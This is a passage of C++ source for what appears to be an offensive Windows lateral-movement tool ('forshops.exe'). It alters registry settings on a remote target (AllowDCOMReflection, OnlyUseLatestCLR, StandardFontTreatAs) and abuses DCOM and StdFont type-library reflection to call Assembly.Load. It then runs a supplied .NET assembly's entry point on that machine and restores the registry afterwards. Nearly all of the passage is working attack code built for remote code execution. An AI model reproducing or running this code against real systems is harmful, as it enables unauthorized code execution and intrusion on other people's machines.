            hr = pTypeLib->GetTypeInfoOfGuid(iid, &pTypeInfo);                          // $ti = $lib.GetTypeInfoOfGuid($iid)

            hr = pTypeInfo->GetRefTypeOfImplType(0, &hRef);                             // $href = $ti.GetRefTypeOfImplType(0)
            hr = pTypeInfo->GetRefTypeInfo(hRef, &pTypeInfo2);                          // $base = $ti.GetRefTypeInfo($href)
            hr = pTypeInfo2->GetContainingTypeLib(&pTypeLib2, 0);                       // $stdole = $base.GetContainingTypeLib()
            hr = pTypeLib2->GetTypeInfoOfGuid(CLSID_StdFont, &pTypeInfo3);              // $ti = $stdole.GetTypeInfoOfGuid("0be35203-8f91-11ce-9de3-00aa004bb851")
            hr = pTypeInfo3->CreateInstance(nullptr, IID_IObject, (void**)&obj);        // $font = $ti.CreateInstance()
            //////////////////////////////

            std::wcout << L"[+] Successfully got StdFont TypeInfo" << std::endl;
            if (SUCCEEDED(hr))
            {
                hr = obj->GetType(&type);
                BSTR b = SysAllocStringByteLen(NULL, 255);
                hr = type->get_ToString(&b);
                hr = type->GetType(&type2);
                hr = type2->get_BaseType(&baseType);
                hr = baseType->get_BaseType(&type3);

                getTypeMethod = GetStaticMethod(type3, L"GetType", 1);
                printf("[*] GetTypeMethod Address: %p\n", (void*)getTypeMethod.GetInterfacePtr());

                std::vector<variant_t> getTypeArgs;
                getTypeArgs.push_back(L"System.Reflection.Assembly, mscorlib");

                type = ExecuteMethod<mscorlib::_TypePtr>(getTypeMethod, getTypeArgs);

                if (type)
                {
                    printf("[+] Got Assembly type\n");
                    loadMethod = GetStaticMethod(type, L"Load", 1);
                    if (loadMethod)
                    {
                        printf("[+] Got Load method\n");

                        //////////////////////////////
                        SIZE_T size = 0;
                        PBYTE  bytes = readFileToBytes(assemblyPath, &size);

                        variant_t obj = { 0 };

                        // Parent array -- object[] {}
                        SAFEARRAY* psa;
                        SAFEARRAYBOUND rgsabound[1];
                        rgsabound[0].lLbound = 0;
                        rgsabound[0].cElements = 1;
                        psa = SafeArrayCreate(VT_VARIANT, 1, rgsabound);

                        // Byte array  -- byte[] {}
                        SAFEARRAY* _psa;
                        SAFEARRAYBOUND _rgsabound[1];
                        _rgsabound[0].lLbound = 0;
                        _rgsabound[0].cElements = size;
                        _psa = SafeArrayCreate(VT_UI1, 1, _rgsabound);
                        PVOID pvData = NULL;
                        hr = SafeArrayAccessData(_psa, &pvData);
                        memcpy(pvData, bytes, size);
                        hr = SafeArrayUnaccessData(_psa);
                        pvData = NULL;

                        // Fill in the parent array -- object[] { byte[] {} }
                        LONG index = 0;
                        VARIANT var;
                        VariantInit(&var);
                        var.vt = VT_ARRAY | VT_UI1;
                        var.parray = _psa;
                        SafeArrayPutElement(psa, &index, &var);

                        // Pass it in
                        VARIANT vtRet;
                        VariantInit(&vtRet);
                        hr = loadMethod->Invoke_3(obj, psa, &vtRet);  // Fixed: Added vtRet parameter to match CLR v4 signature
                        printf("Load -- Invoke_3: 0x%x, ret:0x%x\n", hr, vtRet.punkVal);
                        mscorlib::_AssemblyPtr result = vtRet.punkVal;
                        VariantClear(&var);
                        VariantClear(&vtRet);
                        SafeArrayDestroy(psa);

                        ////////////////////////////////

                        if (result)
                        {
                            printf("[+] Assembly loaded successfully\n");

                            // Get EntryPoint
                            mscorlib::_MethodInfoPtr entryPoint;
                            hr = ((mscorlib::_AssemblyPtr)result)->get_EntryPoint(&entryPoint);
                            if (SUCCEEDED(hr) && entryPoint)
                            {
                                printf("[+] Got entry point\n");

                                // Create string[] args for Main
                                SAFEARRAYBOUND bounds = { 1, 0 }; // Array of size 1
                                SAFEARRAY* psaStrings = SafeArrayCreate(VT_BSTR, 1, &bounds);
                                if (psaStrings)
                                {
                                    // Add your string argument
                                    LONG index = 0;
                                    BSTR arg = SysAllocString(L"");
                                    hr = SafeArrayPutElement(psaStrings, &index, arg);
                                    SysFreeString(arg);

                                    // Create variant to hold string array
                                    VARIANT vArgs;
                                    VariantInit(&vArgs);
                                    V_VT(&vArgs) = VT_ARRAY | VT_BSTR;
                                    V_ARRAY(&vArgs) = psaStrings;

                                    // Create args vector with our string array
                                    std::vector<variant_t> mainArgs;
                                    mainArgs.push_back(vArgs);

                                    printf("[*] Invoking Main with args...\n");
                                    variant_t mainResult = ExecuteMethod<variant_t>(entryPoint, mainArgs, &hr);
                                    printf("[+] Main executed successfully\n");

                                    // Cleanup
                                    SafeArrayDestroy(psaStrings);
                                }
                            }
                            else
                            {
                                printf("[-] Failed to get entry point: 0x%08lX\n", hr);
                            }
                        }
                        else
                        {
                            printf("[-] Load failed: 0x%x\n", result);
                        }
                    }
                }
            }
        }

        if (og.AllowDCOMReflection) free(og.AllowDCOMReflection);
        if (og.OnlyUseLatestCLR) free(og.OnlyUseLatestCLR);
        if (og.StandardFontTreatAs) free(og.StandardFontTreatAs);

        // Clear all COM pointers
        loadMethod = nullptr;
        getTypeMethod = nullptr;
        baseType = nullptr;
        type = nullptr;
        obj = nullptr;
        pTypeInfo = nullptr;
        pTypeLib = nullptr;

        CoUninitialize();

        return 0;
    }
    catch (HRESULT hr)
    {
        printf("[-] COM error occurred: 0x%08lX\n", hr);
        return 1;
    }
    catch (...)
    {
        printf("[-] Unknown error occurred\n");
        return 1;
    }
}
int main(INT argc, PCHAR argv[])
{
    if (argc != 3) {
        printf("Usage: forshops.exe [target] [c:\\path\\to\\assembly\\to\\load] \n");
        return 1;
    }

    LPSTR    target = argv[1];
    LPSTR    assemblyPath = argv[2];
    ACL_INFO sids = { 0 };
    EnableRemoteRegistry = TRUE;
    og = { 0 };

    // Get SIDs
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PSID adminSid = NULL;
    PSID trustedInstallerSid = NULL;

    if (!AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminSid))
    {
        printf("[-] AllocateAndInitializeSid() failed for Administrators: %d\n", GetLastError());
        return 1;
    }

    if (!AllocateAndInitializeSid(&ntAuthority, SECURITY_SERVICE_ID_RID_COUNT, SECURITY_SERVICE_ID_BASE_RID,
        SECURITY_TRUSTED_INSTALLER_RID1, SECURITY_TRUSTED_INSTALLER_RID2,
        SECURITY_TRUSTED_INSTALLER_RID3, SECURITY_TRUSTED_INSTALLER_RID4,
        SECURITY_TRUSTED_INSTALLER_RID5, 0, 0, &trustedInstallerSid))
    {
        printf("[-] AllocateAndInitializeSid() failed for TrustedInstaller: %d\n", GetLastError());
        return 1;
    }
    sids.AdminSid = adminSid;
    sids.NtAuthority = &ntAuthority;
    sids.TrustedInstallerSid = trustedInstallerSid;

    // Execute ForShops
    if (DoRegistry_RPC(target, FALSE, &sids)) {
        return 1;
    }

    ExecuteForShops(target, assemblyPath);

    if (DoRegistry_RPC(target, TRUE, &sids)) {
        return 1;
    }
}
